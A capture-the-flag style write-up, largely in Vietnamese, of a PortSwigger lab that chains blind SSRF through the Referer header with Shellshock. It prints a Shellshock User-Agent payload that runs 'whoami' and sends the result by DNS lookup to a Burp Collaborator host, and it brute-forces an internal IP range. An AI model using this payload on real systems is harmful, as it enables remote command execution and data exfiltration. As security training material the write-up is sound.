# Target Goal: 

This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.

To solve the lab, use this functionality to perform a blind SSRF attack against an internal server in the `192.168.0.X` range on port `8080`. In the blind attack, use a Shellshock payload against the internal server to exfiltrate the name of the OS user.

# Analysis : 

Bài này chính là ứng dụng của bài [Lab 3](https://github.com/vanniichan/Portswigger/tree/main/SSRF/Lab_3)

Bắt request GET tới 1 sản phẩm bất kì, đổi `Referer Heade`r thành địa chỉ `BurpCollab` cá nhân. Xác nhận bất cứ khi nào request này gửi đi, sẽ có kết nối đến `BurpCollab`.

![image](https://github.com/vanniichan/Portswigger/assets/112863484/3ec86dac-7098-4bdb-ade2-a00601cb271f)

`Collaborator Everywhere` là 1 extension đẩy các payload không có hại vào các trường header để kiểm tra xem có trường nào ping ngược lại hay không. Nếu có nó sẽ có thể xảy ra 1 lỗ hổng blind nào đó. Trong bài lab này, xuất hiện một số pingback đến collaborator, trong đó có connection từ `Referer` và `User-Agent`. Có vẻ ngoài việc lấy URL từ `Referer`, phần mềm bên ngoài còn sử dụng cả `User-Agent`. Do đó sẽ tạo ra thêm 1 pingback connection

![image](https://github.com/vanniichan/Portswigger/assets/112863484/bda7e600-fe53-4a7b-a497-f4cedeab1e76)

Sử dụng payload của shellshock `() { :; }; /usr/bin/nslookup $(whoami).7qyvk4vrf3a4twh17fc1erxvsmydm4at.oastify.com` để chèn vào `User-Agent`. Khi chạy, payload sẽ chạy lệnh nslookup tới địa chỉ được chỉ định kèm theo kết quả của lệnh whoami.

![image](https://github.com/vanniichan/Portswigger/assets/112863484/3c2e3f3a-94db-4d05-8953-3f748496ea5c)

`Burp Collabor` không trả về cái gì. Lý do là vì nó không nằm ở `192.168.0.1` 

![image](https://github.com/vanniichan/Portswigger/assets/112863484/a3050721-7e79-410a-87af-21e390908ee9)

Brute-force địa chỉ ip và ta đã nhận được respond:

![image](https://github.com/vanniichan/Portswigger/assets/112863484/69d28e84-59d0-494e-a56a-a145cafcaa98)

# Flag:

![image](https://github.com/vanniichan/Portswigger/assets/112863484/4125e8ec-711b-404e-8730-6dd1b9075afd)
